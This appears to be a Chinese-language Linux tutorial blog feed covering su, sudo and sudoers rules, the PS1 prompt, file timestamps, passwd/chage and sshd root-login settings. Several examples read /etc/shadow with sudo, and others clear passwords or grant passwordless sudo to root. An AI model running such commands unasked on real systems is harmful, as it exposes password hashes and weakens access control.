的优缺点&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;su 的确为管理带来方便，通过切换到 root 下，能完成所有系统管理工具，只要把 root 的密码交给任何一个普通用户，它都能切换到 root 来完成所有的系统管理工作；但通过 su 切换到 root 后，也有不安全因素；比如系统有10个用户，而且都参与管理。如果这10个用户都涉及到超级权限的运用，作为管理员如果想让其他用户通过 su 来切换到 超级权限的 root ，必须把 root 权限密码都告诉这10个用户、如果这10个用户都有 root 权限，通过 root 权限可以做任何事，这在一定程度上就对系统的安全造成了威胁，简直是噩梦；“没有不安全的系统，只有不安全的人” ，绝对不能保证这10个用户都能按正常操作流程来管理系统，其中任何一个人对系统操作的重大失误，都可能导致系统崩溃或数据丢失；所以 su 工具在多人参与的系统管理中，并不hi是最好的选择，su 只适合于一两个人参与管理的系统，毕竟 su 并不能让普通用户受限的使用；超级用户 root 密码应该掌握在少数用户手中，这绝对是真理！所以集权而治的存在是有一定道理的。 sudo 授权许可使用的 su ，也是受限制的 su一、sudo 的适用条件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于su 对切换到超级权限用户root后，权限的无限制性，所以su并不能担任多个管理员所管理的系统。如果用su 来切换到超级用户来管理系统，也不能明确哪些工作是由哪个管理员进行的操作。特别是对于服务器的管理有多人参与管理时，最好是针对每个管理员的技术特长和管理范围，并且有针对性的下放给权限，并且约定其使用哪些工具来完成与其相关的工作，这时我们就有必要用到 sudo。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通过sudo，我们能把某些超级权限有针对性的下放，并且不需要普通用户知道root密码，所以sudo 相对于权限无限制性的su来说，还是比较安全的，所以sudo 也能被称为受限制的su ；另外sudo 是需要授权许可的，所以也被称为授权许可的su；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sudo 执行命令的流程是当前用户切换到root（或其它指定切换到的用户），然后以root（或其它指定的切换到的用户）身份执行命令，执行完成后，直接退回到当前用户；而这些的前提是要通过sudo的配置文件/etc/sudoers来进行授权；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;比如我们想用beinan普通用户通过more /etc/shadow文件的内容时，可能会出现下面的情况； 12[beinan@localhost ~]?$ more /etc/shadow/etc/shadow: 权限不够 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这时我们可以用sudo more /etc/shadow 来读取文件的内容；就就需要在/etc/soduers中给beinan授权&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;于是我们就可以先su 到root用户下通过visudo 来改/etc/sudoers ；（比如我们是以beinan用户登录系统的） 12[beinan@localhost ~]?$ suPassword: 注：在这里输入root密码 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面运行 visudo 1[root@localhost beinan]# visudo 注：运行visudo 来改 /etc/sudoers &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入如下一行，退出保存；退出保存，在这里要会用vi，visudo也是用的vi编辑器；至于vi的用法不多说了；beinan ALL=/bin/more 表示beinan可以切换到root下执行more 来查看文件；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;退回到beinan用户下，用exit命令； 123[root@localhost beinan]# exitexit[beinan@localhost ~]?$ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看beinan的通过sudo能执行哪些命令？ 1234[beinan@localhost ~]?$ sudo -lPassword: 注：在这里输入beinan用户的密码User beinan may run the following commands on this host: 注：在这里清晰的说明在本台主机上，beinan用户可以以root权限运行more ；在root权限下的more ，可以查看任何文本文件的内容的；(root) /bin/more &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最后，我们看看是不是beinan用户有能力看到/etc/shadow文件的内容； 1[beinan@localhost ~]?$ sudo more /etc/shadow &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;beinan 不但能看到 /etc/shadow文件的内容，还能看到只有root权限下才能看到的其它文件的内容，比如； 1[beinan@localhost ~]?$ sudo more /etc/gshadow &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;对于beinan用户查看和读取所有系统文件中，我只想把/etc/shadow 的内容可以让他查看；可以加入下面的一行； 1beinan ALL=/bin/more /etc/shadow &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;题外话：有的弟兄会说，我通过su 切换到root用户就能看到所有想看的内容了，哈哈，对啊。但咱们现在不是在讲述sudo的用法吗？如果主机上有多个用户并且不知道root用户的密码，但又想查看某些他们看不到的文件，这时就需要管理员授权了；这就是sudo的好处； 实例：练习用户组在/etc/sudoers中写法；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果用户组出现在/etc/sudoers 中，前面要加%号，比如%beinan ，中间不能有空格；%beinan ALL=/usr/sbin/*,/sbin/*&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果我们在 /etc/sudoers 中加上如上一行，表示beinan用户组下的所有成员，在所有可能的出现的主机名下，都能切换到root用户下运行 /usr/sbin和/sbin目录下的所有命令； 实例：练习取消某类程序的执行：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;取消程序某类程序的执行，要在命令动作前面加上!号； 在本例中也出现了通配符的*的用法； 1beinan ALL=/usr/sbin/*,/sbin/*,!/usr/sbin/fdisk 注：把这行规则加入到/etc/sudoers中；但您得有beinan这个用户组，并且beinan也是这个组中的才行； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;本规则表示beinan用户在所有可能存在的主机名的主机上运行/usr/sbin和/sbin下所有的程序，但fdisk 程序除外； 12345[beinan@localhost ~]?$ sudo -lPassword: 注：在这里输入beinan用户的密码；User beinan may run the following commands on this host:(root) /usr/sbin/*(root) /sbin/*(root) !/sbin/fdisk[beinan@localhost ~]?$ sudo /sbin/fdisk -lSorry, user beinan is not allowed to execute '/sbin/fdisk -l' as root on localhost. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：不能切换到root用户下运行fdisk 程序；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果有sudo 的权限而没有su的权限: sudo su;]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 环境变量之“PS1”]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F16.%20Linux%20%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B9%8B%E2%80%9CPS1%E2%80%9D%2F</url>
    <content type="text"><![CDATA[Linux 环境变量之“PS1”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PS1（是数字1而不是字母l），每个版本bash的PS1变量内的特殊符号可能有些小的差异，你可以先man bash 一下。下面是FC4环境下默认的特殊符号所代表的意义： \d ：代表日期，格式为weekday month date，例如：”Mon Aug 1” \H ：完整的主机名称。例如：我的机器名称为：fc4.linux，则这个名称就是fc4.linux \h ：仅取主机的第一个名字，如上例，则为fc4，.linux则被省略 \t ：显示时间为24小时格式，如：HH：MM：SS \T ：显示时间为12小时格式 \A ：显示时间为24小时格式：HH：MM \u ：当前用户的账号名称 \v ：BASH的版本信息 \w ：完整的工作目录名称。家目录会以 ~代替 \W ：利用basename取得工作目录名称，所以只会列出最后一个目录 \# ：下达的第几个命令 \$ ：提示字符，如果是root时，提示符为：# ，普通用户则为：$ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认的PS1内容为： ‘[\u@\h \W]\$ ‘ ，所以默认的提示符就是： [root@localhost ~]# 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但设置PS1的时候需要稍微处理一下 1PS1="[\\u@\\h \\W]\\$ " &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样显示的结果才是正确的]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 文件的三个时间属性]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F15.%20Linux%20%E4%B8%89%E4%B8%AA%E6%97%B6%E9%97%B4%E5%B1%9E%E6%80%A7%2F</url>
    <content type="text"><![CDATA[Linux 文件的三个时间属性&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;平时通常同find命令找一些文件时会用到这些参数。那么这三个参数到底有啥区别呢。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件的 Access time，atime 是在读取文件或者执行文件时更改的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件的 Modified time，mtime 是在写入文件时随文件内容的更改而更改的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件的 Change time，ctime 是在写入文件、更改所有者、权限或链接设置时随 Inode 的内容更改而更改的。 modify time（mtime）创建或更改的时间access time (atime) 访问的时间change time (ctime) 更改原数据（inode号，属性，权限等）的时间 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因此，更改文件的内容即会更改 mtime 和 ctime，但是文件的 ctime 可能会在 mtime 未发生任何变化时更改，如权限更改了但文件内容没有更改。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ls(1) 命令可用来列出文件的 atime、ctime 和 mtime。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ls -lc filename 列出文件的 ctime &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ls -lu filename 列出文件的 atime &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ls -l filename 列出文件的 mtime 12345678ls -l filename（ls默认显示的是mtime） -rw-rw-r-- 1 lawrance lawrance 27 Oct 5 02:09 filename ls -l --time=ctime filename -rwxr-xr-x 1 lawrance lawrance 27 Oct 6 02:50 filename ls -l --time=atime filename -rw-rw-r-- 1 lawrance lawrance 27 Oct 6 02:30 filename &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1、访问时间，每次读取文件的内容，时间就会更新。比如对这个文件运用 more、cat等命令。ls、stat命令都不会修改文件的访问时间。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2、修改时间，修改时间是文件内容最后一次被修改时间。比如：vi后保存文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;3、状态改动时间。文件属性最后一次被修改的时间，通过chmod、chown命令修改一次文件属性，这个时间就会更新。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;atime不一定在访问文件之后被修改，因为：使用ext3文件系统的时候，如果在mount的时候使用了noatime参数那么就不会更新atime的信息。而这是加了 noatime 取消了, 不代表真实情況。反正, 这三个 time stamp 都放在 inode 中. 若 mtime, atime 修改, inode 就一定會改, 既然 inode 改了, 那 ctime 也就跟著要改了（理论上是这样的，但是真实情况并非如此，如果是读取文档或者执行二进制文件的时候，虽然atime会变，但ctime不变，这是系统这样设计的）.]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux sudo 详解]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F13.%20Linux%20sudo%20%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[Linux sudo 详解&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用 su 可以切换用户身份，如果每个普通用户都能切换到 root 身份，如果某个用户不小心泄漏了 root 密码，那么系统是非常的不安全的。为了改进这个问题，产生了 sudo 这个命令。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用 sudo 执行一个 root 才能执行的命令是可以办到的，但是需要输入密码，这个密码并不是 root 的密码，而是用户自己的密码。默认只有 root 用户能使用 sudo 命令，普通用户想要使用 sudo ，是需要 root 预先设定的。使用 visudo 命令去编辑相关的配置文件 /etc/sudoers 。如果没有 visudo 这个命令，使用 yum 安装： 1yum install -y sudo 语法1sudo [选项] [参数] 选项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-b：在后台执行指令；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-h：显示帮助；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-H：将HOME环境变量设为新身份的HOME环境变量；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-k：结束密码的有效期限，也就是下次再执行sudo时便需要输入密码；。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-l：列出目前用户可执行与无法执行的指令；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-p：改变询问密码的提示符号；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-s：执行指定的shell；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-u&lt;用户&gt;：以指定的用户作为新的身份。若不加上此参数，则预设以root作为新的身份；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-v：延长密码有效期限5分钟；&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-V ：显示版本信息。 参数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;指令：需要运行的指令和对应的参数。 配置 sudo&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认 root 能够 sudo 是因为这个文件中有一行 “root ALL=(ALL) ALL” 在该行下面加入 “test ALL=(ALL) ALL” 就可以让 test 用户拥有了 sudo 的权利。使用 “visudo” 命令编辑 /etc/sudoers 配置文件，其实操作方法和 “vim” 命令使用方法是一样的，按 “i” 进入编辑模式，编辑完成后，按 “Esc” ，再输入 “:wq” 完成保存。 123## Allow root to run any commands anywhereroot ALL=(ALL) ALLtest ALL=(ALL) ALL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;此时可以验证一下 test 账户的权限了 1234567891011121314[root@localhost ~]# su test[test@localhost root]$ lsls: 无法打开目录.: 权限不够[test@localhost root]$ sudo lsWe trust you have received the usual lecture from the local SystemAdministrator. It usually boils down to these three things: #1) Respect the privacy of others. #2) Think before you type. #3) With great power comes great responsibility.[sudo] password for test:123 456 789 anaconda-ks.cfg dirb install.log install.log.syslog test test1 test2 test3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于切换到 test 账户后的当前目录依旧是在 /root 下， test 账户没有任何权限，所以 ‘ls’ 的时候提示说权限不够，然而使用 sudo ls 输入 test 账户自身的密码后就有权限了。初次使用 sudo 时会有上面的一大段提示，而后再次使用 sudo 命令则不再提示。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果每增加一用户就设置一行，这样太麻烦了。所以可以这样设置。把 “#%wheel ALL=(ALL) ALL” 前面 ‘#’ 去掉，让这一行生效。意思是， wheel 这个组的所有用户都拥有了 sudo 权利。接下来只需要把想让 sudo 权利的所有用户加入到 wheel 这个组中即可： 12## Allows people in group wheel to run all commands%wheel ALL=(ALL) ALL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置文件 /etc/sudoers 包含了诸多配置项，可以使用 man sudoers 来获得帮助信息。 实例&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置 sudo 必须通过编辑 /etc/sudoers 文件，而且只有超级用户才可以修改它，还必须使用 visudo 编辑。之所以使用 visudo 有两个原因： 它能后防止一两个用户同时修改它； 它也能进行有限的语法检查。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以，即时只有一个超级用户，也最好用 visudo 来检查一下语法。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;visudo 默认的是在 vi 里打开配置文件，用 vi 来修改文件。可以在编译时修改这个默认项。 visudo 不会擅自保存带有语法错误的配置文件，它会提示出现的问题，并询问该如何处理： 1&gt;&gt;&gt; sudoers file: syntax error, line 22 &lt;&lt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;此时有三种选择： 键入 “e” 是重新编辑 键入 “x” 是不保存退出 键入 “Q” 是退出并保存 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果选择 Q ,那么 sudo 将不回再运行，知道错误被纠正。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需求是把 Linux 服务器设置成：只允许使用普通账户登录，而普通账户登录后，可以不输入密码就能 sudo 切换到 root 账户。 1[root@localhost ~]# visudo &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后在文件的最后面加三行： 123User_Alias USER_SU = test, test1, yanyiCmnd_Alias SU = /bin/suUSER_SU ALL=(ALL) NOPASSWD: SU &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存配置文件后，使用 test 、test1 、yanyi 三个账户登录 Linux 后，执行命令 sudo su - 切换到 root 账户，获取 root 账户的所有权利。 1234[root@localhost ~]# su - test[test@localhost ~]$ sudo su -[root@localhost ~]# whoamiroot 日志与安全&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sudo 为安全考虑得很周到，不仅可以记录日志，还能在有必要时向系统管理员报告。但是， sudo 的日志功能不是自动的，必须由管理员开启。 12touch /var/log/sudovi /etc/syslog.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 syslog.conf 最后面加一行（必须用 tab 分隔开）并保存： 1local2.debug /var/log/sudo &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启日志守候进程 1ps aux | grep syslogd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把得到的 syslog 进程的 PID (输出的第二列是 PID)填入下面 1kill -HUP PID &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样 sudo 就可以写日志了： 12345[foobar@localhost ~]$ sudo ls /rootanaconda-ks.cfg Desktop install.log install.log.syslog $cat /var/log/sudoJul 28 22:52:54 localhost sudo: foobar : TTY=pts/1 ; pwd=/home/foobar ; USER=root ; command=/bin/ls /root &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不过，有个小小的“缺陷”，sudo 记录日志并不是很忠实： 123[foobar@localhost ~]$ sudo cat /etc/shadow &gt; /dev/nullcat /var/log/sudo...Jul 28 23:10:24 localhost sudo: foobar : TTY=pts/1 ;PWD=/home/foobar ; USER=root ; COMMAND=/bin/cat /etc/shadow &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重定向没有被记录在日志里，因为在命令运行之前，shell 把重定向的工作做完了，sudo 根本就没有看到重定向。这样也有个好处，下面的手段不回得逞： 1[foobar@localhost ~]$ sudo ls /root &gt; /etc/shadowbash: /etc/shadow: 权限不够 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sudo 有自己的方式来保护安全。以 root 的身份执行 sudo -v ，查看 sudo 的设置。因为考虑到安全问题，一部分环境变量并没有传递给 sudo 后面的命令，或者被检查后再传递的，比如：PATH 、HOME 、SHELL 等。当然也可以通过 sudoers 来配置环境变量。 sudo -i 也可以登录到 root&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sudo : 暂时切换到超级用户模式以执行超级用户权限，提示输入密码时该密码为当前用户的密码，而不是超级账户的密码。不过有时间限制，Ubuntu默认为一次时长15分钟。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;su ： 切换到某某用户模式，提示输入密码时该密码为切换后账户的密码，用法为“su 账户名称”。如果后面不加账户时系统默认为root账户，密码也为超级账户的密码。没有时间限制。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sudo -i: 为了频繁的执行某些只有超级用户才能执行的权限，而不用每次输入密码，可以使用该命令。提示输入密码时该密码为当前账户的密码。没有时间限制。执行该命令后提示符变为“#”而不是“$”。想退回普通账户时可以执行“exit”或“logout” 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还有几个类似的用法： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sudo /bin/bash ： 这个命令也会切换到root的bash下，但不能完全拥有root的所有环境变量，比如PATH，可以拥有root用户的权限。这个命令和 sudo -s 是等同的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sudo -s : 如上 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sudo su ： 这个命令，也是登录到了root，但是并没有切换root的环境变量，比如PATH。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;sudo su - : 这个命令，纯粹的切换到root环境下，可以这样理解，先是切换到了root身份，然后又以root身份执行了 su - ，这个时候跟使用root登录没有什么区别。这个结果貌似跟sudo -i 的效果是一样的，但是也有不同，sudo 只是临时拥有了root的权限，而su则是使用root账号登录了linux系统。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所以，我们再来总结一下： sudo su - 约等于 sudo -i sudo -s 完全等于 sudo /bin/bash 约等于 sudo su sudo 终究被一个”临时权限的帽子”扣住，不能等价于纯粹的登录到系统里。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 修改用户密码]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F10.%20Linux%20passwd%20%E4%BF%AE%E6%94%B9%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%2F</url>
    <content type="text"><![CDATA[Linux 修改用户密码命令：passwd语法：1passwd [username] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建完账户后，默认是没有设置密码的，虽然没有密码，但该账户同样登录不了系统。只有设置好密码后才能登录系统。为用户创建密码时，为了安全起见，尽量设置复杂一些。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以按照这样的规则来设置密码： 长度大于10个字符； 密码中包含大小写字母数字以及特殊字符 ‘*’ ，‘&amp;’ ，‘%’ 等； 不规则性（不要出现 root 、happy 、love 、linux 、7758520 、111111 等等单词或者数字）； 不要带有自己的名字、公司名字、自己电话、自己生日等。 12345[root@localhost ~]# passwd更改用户 root 的密码 。新的 密码：重新输入新的 密码：passwd： 所有的身份验证令牌已经成功更新。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“passwd” 后面不加 username 则是修改当先账户的密码。如果登录的是 root 账户，后面可以跟普通用户的名字，意思是修改指定账户的密码。 12345[root@localhost ~]# passwd user11更改用户 user11 的密码 。新的 密码：重新输入新的 密码：passwd： 所有的身份验证令牌已经成功更新。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只有 root 用户才可以修改其他账户的密码，普通账户只能修改自己的密码，其他账户的密码是不可以修改的。 passwd 几个比较重要的参数12345678910111213141516[root@localhost beinan]# passwd --helpUsage: passwd [OPTION...] &lt;accountName&gt;-k, --keep-tokens keep non-expired authentication tokens 注：保留即将过期的用户在期满后能仍能使用；-d, --delete delete the password for the named account (root only) 注：删除用户密码，仅能以root权限操作；-l, --lock lock the named account (root only) 注：锁住用户无权更改其密码，仅能通过root权限操作；-u, --unlock unlock the named account (root only) 注：解除锁定；-f, --force force operation 注：强制操作；仅root权限才能操作；-x, --maximum=DAYS maximum password lifetime (root only) 注：两次密码修正的最大天数，后面接数字；仅能root权限操作；-n, --minimum=DAYS minimum password lifetime (root only) 注：两次密码修改的最小天数，后面接数字，仅能root权限操作；-w, --warning=DAYS number of days warning users receives before 注：在距多少天提醒用户修改密码；仅能root权限操作；password expiration (root only)-i, --inactive=DAYS number of days after password expiration when an 注：在密码过期后多少天，用户被禁掉，仅能以root操作；account becomes disabled (root only)-S, --status report password status on the named account (root 注：查询用户的密码状态，仅能root用户操作；only)--stdin read new tokens from stdin (root only) 命令：mkpasswd&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个命令经常用来生成密码，省的去想。默认 Linux 是没有这个命令的，需要安装一个包 “expect” ，如果 CentOS 可以上网，也可以使用命令完成安装。 1yum install -y expect &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;安装好后，输入命令： 12[root@localhost ~]# mkpasswdHXut8oy*8 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;生成的随机字符串就可以作为一个密码，只不过这个密码不容易记忆。 锁定和解锁某个账户锁定账户语法1passwd -l username &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;让某个账户不能修改密码，可以用 -l 参数来锁定: 123456789[root@localhost ~]# passwd -l beinan 注：锁定用户beinan不能更改密码；Locking password for user beinan.passwd: Success 注：锁定成功；[beinan@localhost ~]# su beinan 注：通过su切换到beinan用户；[beinan@localhost ~]$ passwd 注：beinan来更改密码；Changing password for user beinan.Changing password for beinan(current) UNIX password: 注：输入beinan的当前密码；passwd: Authentication token manipulation error 注：失败，不能更改密码； 解锁账户语法1passwd -u username &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：这两个用法只有 root 账户才有资格执行。 清除账户密码语法1passwd -d username &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例： 1234567[root@localhost ~]# passwd -d beinan 注：清除beinan用户密码；Removing password for user beinan.passwd: Success 注：清除成功；[root@localhost ~]# passwd -S beinan 注：查询beinan用户密码状态；Empty password. 注：空密码，也就是没有密码；注意： 当我们清除一个用户的密码时，登录时就无需密码；这一点要加以注意 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：当清除一个账户的密码时，登录时就无需密码;这一点要嫁衣注意； 密码时效命令：chage语法1chage [选项] [username] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;chage 命令的选项说明：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-m days： 密码可更改的最小天数。为零时代表任何时候都可以更改密码。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-M days： 指定口令有效的最多天数。当该选项指定的天数加上-d选项指定的天数小于当前的日期时，用户在使用该帐号前就必须改变口令。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-d days： 指定从1970年1月1日起，口令被改变的天数。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-I days： 指定口令过期后，帐号被锁前不活跃的天数。如果值为0，帐号在口令过期后就不会被锁。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-E date： 指定帐号被锁的日期。日期格式YYYY-MM-DD。若不用日期，也可以使用自1970年1月1日后经过的天数。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-W days： 指定口令过期前要警告用户的天数。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-l： 列出指定用户当前的口令时效信息，以确定帐号何时过期。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;例如：要求用户 user1 两天内不能更改口令，并且口令最长的存活期为30天，并且口令过期前5天通知用户 1chage -m 2 -M 30 -W 5 user1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以使用如下命令查看用户 user1 当前的口令时效信息： 1chage -l user1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;提示： 可以使用 chage [用户名] 进入交互模式修改用户的口令时效。 修改口令实质上就是修改影子口令文件 /etc/shadow 中与口令时效相关的字段值。 chage 修改用户密码有限期限的命令chage 语法格式1chage [-l] [-m 最小天数] [-M 最大天数] [-W 警告] [-i 失效日] [-E 过期日] [-d 最后日] username]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 用户切换]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F12.%20Linux%20su%20%E5%88%87%E6%8D%A2%E7%94%A8%E6%88%B7%2F</url>
    <content type="text"><![CDATA[Linux 用户切换&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令：su &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;语法 1su [-] username &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;后面可以跟 ‘-’ 也可以不跟，普通用户 su 不加 username 时就是切换到 root 用户，当然 root 用户同样可以 su 到普通用户。 ‘-’ 这个字符的作用是，加上后会初始化当前用户的各种环境变量。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;做个实验说明加与不加 ‘-’ 的区别： 123456789101112[test@localhost ~]$ pwd/home/test[test@localhost ~]$ su密码：[root@localhost test]# pwd/home/test[root@localhost test]# exitexit[test@localhost ~]$ su -密码：[root@localhost ~]# pwd/root &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果不加 ‘-’ 切换到 root 账户下时，当前目录没有变化，而加上 ‘-’ 切换到 root 账户后，当前目录为 root 账户的家目录，这跟直接登录 root 账户是一样的。当用 root 切换普通用户时，是不需要输入密码的。这也体现了 root 用户至高无上的权利。 以某一个用户的身份执行某一个命令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;语法 1su -c "command" username &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;示例&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用 www 的用户身份执行 /home/www/test.sh 这个脚本 1su -c "/home/www/test.sh" www &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;前提是，/home/www/test.sh 这个脚本文件 www 用户有执行权限 如何限制远程登录时，不允许 root 登录，而只允许普通用户登录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改配置文件 /etc/sshd/sshd_config 1vim /etc/sshd/sshd_config &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在文件中查找 “#PermitRoorLogin yes” 这句话，修改为 “PermitRootLogin no” 表示不允许 root 用户远程登录。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/sshd/sshd_config 为 sshd 服务的配置文件，默认虽然在前面加 “#” 注释了这句，“PermitRootLogin yes” 但它默认就是允许 root 账户登录的，所以要想不让 root 登录，修改为 no 就可以了。保存配置文件后，重启 sshd 服务： 1service sshd restart 如何限制远程登录时，只允许 root 使用密钥登录，而不能使用密码登录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;打开配置文件 /etc/sshd/sshd_config 1vim /etc/sshd/sshd_config &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加上一句： 1PermitRootLogin without-password &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存配置文件后，重启 sshd 服务： 1service sshd restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就可以了。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 简介]]></title>
